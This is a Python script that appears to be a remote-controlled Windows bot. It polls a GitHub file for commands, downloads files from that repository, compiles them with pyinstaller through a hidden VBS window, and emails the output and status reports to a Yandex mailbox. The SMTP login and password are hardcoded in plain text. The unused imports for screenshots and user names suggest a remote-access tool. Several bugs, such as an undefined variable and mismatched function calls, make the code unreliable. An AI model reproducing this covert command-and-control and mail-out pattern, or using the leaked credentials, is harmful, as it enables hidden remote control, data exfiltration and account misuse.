import time, os, winshell
from datetime import datetime
import requests, re
from mss import mss
import smtplib
import getpass
import sys
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

static='static'

symbDict={ '&amp;':'&',
		'&#39;':"'",
		'&quot;':'"',
		'&lt;':'<',
		'&gt;':'>' }
def changeSymb(symb):
	global symbDict
	return symbDict[symb]


def sendFile(file, name):
	exe_name=name[:-2]
	exe_name+='exe'
	msg = MIMEMultipart()
	msg['Subject'] = str('Your compiled '+str(name))
	msg['From'] = 'elliot.bit@yandex.ru'
	part = MIMEText('\n')
	msg.attach(part)
	try:
		part = MIMEApplication(open(file, 'rb').read())
		part.add_header('Content-Disposition', 'attachment', filename=exe_name)
		msg.attach(part)
	except:
		try:
			sendReport('I cannot attach "'+ str(exe_name)+'"')
		except:
			sendReport('I cannot attach the file you want to get')

	try:
		server = smtplib.SMTP('smtp.yandex.com')
		server.ehlo()
		server.starttls()
		server.login('elliot.bit@yandex.ru', 'HEn4^@85b^@GHrf84')
		server.sendmail(msg['From'], ['elliot.bit@yandex.ru'], msg.as_string())
		server.quit()
	except:
		try:
			sendReport('I cannot send "'+ str(exe_name)+'"')
		except:
			sendReport('I cannot send the file you want to get')


def sendReport(info,name):
	msg = MIMEMultipart()
	msg['Subject'] = str('Compiling of '+str(name))
	msg['From'] = 'elliot.bit@yandex.ru'
	part = MIMEText(info)
	msg.attach(part)

	try:
		server = smtplib.SMTP('smtp.yandex.com')
		server.ehlo()
		server.starttls()
		server.login('elliot.bit@yandex.ru', 'HEn4^@85b^@GHrf84')
		server.sendmail(msg['From'], ['elliot.bit@yandex.ru'], msg.as_string())
		server.quit()
	except:
		time.sleep(1)


def compile(filename,options):
	try:
		f=open(static_name,"wb")
		ufr = requests.get("'https://github.com/Elliot-bit/Mommy/blob/master/"+str(filename)+"?raw=true")
		f.write(ufr.content)
		f.close()
		sendReport('I have downloaded "'+ str(filename)+'"')
		if os.path.getsize(filename) < 170000:
			sendReport('Size of "'+ str(filename)+'" is too small. I can be that "'+ str(filename)+'" does not exist in the site')
	except:
		sendReport('I cannot download "'+ str(filename)+'"')
		
	#rename
	global static
	try:
		os.rename(filename,static+'.py')
	except:
		try:
			os.rename(filename,static+'.py')
		except:
			sendReport('I cannot rename your file', filename)
			return
		
	#compile
	f=open('compile.vbs','w')
	f.write('Dim objShell\nDim CommandLine\nSet objShell = CreateObject("Wscript.Shell")\nCommandLine = "pyinstaller '+str(options)+' '+str(static)+'.py"\nobjShell.Run CommandLine, 0, True')
	f.close()
	f=open(static+'.exe','w')
	f.close()
	os.startfile('compile.vbs')
	try:
		sendFile(static+'.exe',filename)
	except:
		try:
			sendFile(static+'.exe',filename)
		except:
			sendReport('I cannot send your program')


done=False		
while True:		
	try:
		responce = requests.get('https://github.com/Elliot-bit/Mommy/blob/master/Compile.txt')
		html = responce.text
	except:
		pass

	try:
		html = html.split('~#')
		html = html[1]
	except:
		html = ''
	
	if html.find('-sl')!=-1:
		done=False
		time.sleep(1)
	
	elif html.find('-c')!=-1 and done==False:
		options = html[html.find('-o')+2:]
		for i in symbDict.keys():
			if i in filename:
				options=options.replace(i,changeSymb(i))
		options = options[options.find('"')+len('"'):]
		options = options[:options.find('"')]
		options=str(options)
		filename = html[html.find('-f')+3:]
		for i in symbDict.keys():
			if i in filename:
				filename=filename.replace(i,changeSymb(i))
		filename = filename[filename.find('"')+len('"'):filename.rfind('"')]
		filename=filename.split('"')
		for i in range(len(filename)):
			try:
				if filename[i]==',':
					del filename[i]
			except:
				pass
		names=filename
		for filename in names:
			try:
				compile(filename,options)
			except:
				try:
					compile(filename,options)
				except:
					sendReport('I cannot start compiling',filename)
		done=True
		
	time.sleep(1)